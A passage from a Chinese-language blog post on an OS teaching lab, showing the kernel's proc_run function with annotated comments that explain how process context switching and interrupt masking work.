<h2 id="练习3-理解proc-run函数和它调用的函数如何完成进程切换的"><a href="#练习3-理解proc-run函数和它调用的函数如何完成进程切换的" class="headerlink" title="练习3-理解proc_run函数和它调用的函数如何完成进程切换的"></a>练习3-理解proc_run函数和它调用的函数如何完成进程切换的</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span></span></span><br><span class="line"><span class="function"><span class="title">proc_run</span><span class="params">(struct proc_struct *proc)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (proc != current) &#123; <span class="comment">/* 再次检查(调度进程,不能等于当前进程) */</span></span><br><span class="line">        <span class="keyword">bool</span> intr_flag;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">proc_struct</span> *<span class="title">prev</span> =</span> current, *next = proc;</span><br><span class="line">        local_intr_save(intr_flag); <span class="comment">/* 阻塞中断 */</span></span><br><span class="line">        &#123;</span><br><span class="line">            current = proc; <span class="comment">/* 设置当前执行的进程 */</span></span><br><span class="line">            load_esp0(next-&gt;kstack + KSTACKSIZE); <span class="comment">/* 设置ring0的内核栈地址 */</span></span><br><span class="line">            lcr3(next-&gt;cr3); <span class="comment">/* 加载页目录表 */</span></span><br><span class="line">            switch_to(&amp;(prev-&gt;context), &amp;(next-&gt;context)); <span class="comment">/* 切换上下文(汇编) */</span></span><br><span class="line">        &#125;</span><br><span class="line">        local_intr_restore(intr_flag); <span class="comment">/* 解除中断的阻塞 */</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>其实这个在前面已经提过了</p>
<p>PS：“local_intr_save”和“local_intr_restore”用于实现“原子操作”，使得某些关键的代码不会被打断，从而避免引起一些未预料到的错误，避免条件竞争 </p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  


  
  <nav class="pagination">
    <a class="extend prev" rel="prev" href="/page/6/"><i class="fa fa-angle-left" aria-label="Previous page"></i></a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/6/">6</a><span class="page-number current">7</span><a class="page-number" href="/page/8/">8</a><span class="space">&hellip;</span><a class="page-number" href="/page/15/">15</a><a class="extend next" rel="next" href="/page/8/"><i class="fa fa-angle-right" aria-label="Next page"></i></a>
  </nav>



          </div>
          

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          Table of Contents
        </li>
        <li class="sidebar-nav-overview">
          Overview
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="yhellow"
      src="/images/avatar.gif">
  <p class="site-author-name" itemprop="name">yhellow</p>
  <div class="site-description" itemprop="description"></div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">150</span>
          <span class="site-state-item-name">posts</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
            <a href="/categories/">
          
        <span class="site-state-item-count">10</span>
        <span class="site-state-item-name">categories</span></a>
      </div>
      <div class="site-state-item site-state-tags">
            <a href="/tags/">
          
        <span class="site-state-item-count">105</span>
        <span class="site-state-item-name">tags</span></a>
      </div>
  </nav>
</div>



      </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        

<div class="copyright">
  
  &copy; 2019 – 
  <span itemprop="copyrightYear">2022</span>
  <span class="with-love">
    <i class="heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">yhellow</span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item-icon">
      <i class="fa fa-chart-area"></i>
    </span>
    <span title="Symbols count total">1.9m</span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item-icon">
      <i class="fa fa-coffee"></i>
    </span>
    <span title="Reading time total">29:19</span>
</div>
  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a>
  </div>

        
<div class="busuanzi-count">
  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
      <span class="post-meta-item-icon">
        <i class="user"></i>
      </span>
      <span class="site-uv" title="Total Visitors">
        <span id="busuanzi_value_site_uv"></span>
      </span>
    </span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
      <span class="post-meta-item-icon">
        <i class="eye"></i>
      </span>
      <span class="site-pv" title="Total Views">
        <span id="busuanzi_value_site_pv"></span>
      </span>
    </span>
</div>








      </div>
    </footer>
  </div>

  
  <script src="/lib/anime.min.js"></script>
  <script src="//cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script>
  <script src="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/pisces.js"></script>


<script src="/js/next-boot.js"></script>




  















  

  
      

<script>
  if (typeof MathJax === 'undefined') {
    window.MathJax = {
      loader: {
        source: {
          '[tex]/amsCd': '[tex]/amscd',
          '[tex]/AMScd': '[tex]/amscd'
        }
      },
      tex: {
        inlineMath: {'[+]': [['$', '$']]},
        tags: 'ams'
      },
      options: {
        renderActions: {
          findScript: [10, doc => {
            document.querySelectorAll('script[type^="math/tex"]').forEach(node => {
              const display = !!node.type.match(/; *mode=display/);
              const math = new doc.options.MathItem(node.textContent, doc.inputJax[0], display);
              const text = document.createTextNode('');
              node.parentNode.replaceChild(text, node);
              math.start = {node: text, delim: '', n: 0};
              math.end = {node: text, delim: '', n: 0};
              doc.math.push(math);
            });
          }, '', false],
          insertedScript: [200, () => {
            document.querySelectorAll('mjx-container').forEach(node => {
              let target = node.parentNode;
              if (target.nodeName.toLowerCase() === 'li') {
                target.parentNode.classList.add('has-jax');
              }
            });
          }, '', false]
        }
      }
    };
    (function () {
      var script = document.createElement('script');
      script.src = '//cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js';
      script.defer = true;
      document.head.appendChild(script);
    })();
  } else {
    MathJax.startup.document.state(0);
    MathJax.texReset();
    MathJax.typeset();
  }
</script>

    

  

</body>
</html>
